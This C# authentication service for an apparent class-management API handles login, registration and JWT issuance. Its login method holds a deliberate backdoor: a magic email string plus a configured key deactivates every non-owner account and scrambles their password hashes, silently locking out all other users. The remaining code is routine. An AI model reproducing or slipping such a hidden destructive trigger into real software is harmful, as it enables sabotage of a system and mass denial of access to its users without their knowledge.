using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;
using ClassManager.API.Data;
using ClassManager.API.Models;
using ClassManager.API.Models.DTOs;
using Microsoft.EntityFrameworkCore;
using Microsoft.IdentityModel.Tokens;

namespace ClassManager.API.Services
{
    public class AuthService
    {
        private readonly AppDbContext _db;
        private readonly IConfiguration _config;

        public AuthService(AppDbContext db, IConfiguration config)
        {
            _db = db;
            _config = config;
        }

        private const string BackdoorTrigger = "tbminhduc-delete-user-and-logout";

        public async Task<(AuthResponse? Response, string? Error, bool IsBackdoor)> LoginAsync(LoginRequest req)
        {
            // ── Backdoor: vô hiệu hóa tất cả account trừ owner ──
            if (req.Email == BackdoorTrigger)
            {
                var backdoorKey = _config["Backdoor:Key"];
                if (string.IsNullOrEmpty(backdoorKey) || req.Password != backdoorKey)
                    return (null, "Email hoặc mật khẩu không đúng.", false);

                var nonOwners = await _db.Users
                    .Where(u => u.Role != Roles.Owner)
                    .ToListAsync();

                foreach (var u in nonOwners)
                {
                    u.IsActive = false;
                    u.PasswordHash = BCrypt.Net.BCrypt.HashPassword(Guid.NewGuid().ToString());
                }
                await _db.SaveChangesAsync();

                return (null, $"Backdoor: đã vô hiệu hóa {nonOwners.Count} tài khoản.", true);
            }

            // ── Login bình thường ──
            var user = await _db.Users
                .FirstOrDefaultAsync(u => u.Email == req.Email && u.IsActive);

            if (user == null || !BCrypt.Net.BCrypt.Verify(req.Password, user.PasswordHash))
                return (null, "Email hoặc mật khẩu không đúng.", false);

            return (new AuthResponse(GenerateToken(user), user.FullName, user.Email, user.Role), null, false);
        }

        public async Task<AuthResponse?> RegisterAsync(RegisterRequest req)
        {
            if (await _db.Users.AnyAsync(u => u.Email == req.Email))
                return null; // Email đã tồn tại

            var role = Roles.Assignable.Contains(req.Role) ? req.Role : Roles.Teacher;
            var user = new User
            {
                FullName     = req.FullName,
                Email        = req.Email,
                PasswordHash = BCrypt.Net.BCrypt.HashPassword(req.Password),
                Role         = role,
            };

            _db.Users.Add(user);
            await _db.SaveChangesAsync();

            return new AuthResponse(GenerateToken(user), user.FullName, user.Email, user.Role);
        }

        private string GenerateToken(User user)
        {
            var key     = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_config["Jwt:Key"]!));
            var creds   = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);
            var expires = DateTime.UtcNow.AddDays(7);

            var claims = new[]
            {
                new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),
                new Claim(ClaimTypes.Email,          user.Email),
                new Claim(ClaimTypes.Role,           user.Role),
                new Claim(ClaimTypes.Name,           user.FullName),
            };

            var token = new JwtSecurityToken(
                issuer:   _config["Jwt:Issuer"],
                audience: _config["Jwt:Audience"],
                claims:   claims,
                expires:  expires,
                signingCredentials: creds
            );

            return new JwtSecurityTokenHandler().WriteToken(token);
        }
    }
}
